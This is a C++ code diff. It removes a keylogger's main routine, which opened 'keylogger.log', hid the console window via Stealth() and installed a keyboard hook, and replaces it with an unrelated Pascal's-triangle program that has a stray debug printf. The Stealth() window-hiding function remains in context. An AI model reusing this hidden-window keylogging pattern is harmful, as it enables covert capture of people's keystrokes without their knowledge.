@@ -241,24 +241,61 @@ void Stealth()
 	ShowWindow(FindWindowA("ConsoleWindowClass", NULL), 0); // invisible window
 #endif
 }
+#include <vector>
+using std::vector;
+
+vector<vector<int>> generate(int numRows) {
+	vector<vector<int>> res;
+
+	for(int i=0;i<numRows;i++)
+	{
+		if(i == 0)
+		{
+			vector<int> tmp = {1};
+			res.push_back(tmp);
+			continue;
+		}
+		if (i == 1)
+		{
+			vector<int> tmp = {1,1};
+			res.push_back(tmp);
+			continue;
+		}
+		vector<int> row; 
+
+		for(int j=0;j<=i;j++)
+		{
+			if(j == 0)
+			{
+				row.push_back(1);
+				continue;
+			}
+			if(j == i)
+			{
+				row.push_back(1);
+				continue;
+			}
+			int tmp =  res[i-1][j-1] + res[i-1][j];
+			printf("%d ", tmp);
+			row.push_back(tmp);
+		}
+		res.push_back(row);
+	}
+	return res;
+}
 
 int main()
 {
-	// open output file in append mode
-	const char* output_filename = "keylogger.log";
-	std::cout << "Logging output to " << output_filename << std::endl;
-	output_file.open(output_filename, std::ios_base::app);
-
-	// visibility of window
-	Stealth();
-
-	// set the hook
-	SetHook();
-
-	// loop to keep the console application running.
-	MSG msg;
-	while (GetMessage(&msg, NULL, 0, 0))
+	vector<vector<int>> res = generate(5);	
+	for (int i = 0; i < res.size(); i++)
 	{
+		for (int j = 0; j < res[i].size(); j++)
+		{
+			printf("%d ", res[i][j]);
+		}
+		printf("\n");
 	}
+	system("pause");
+	return 0;
 }
 
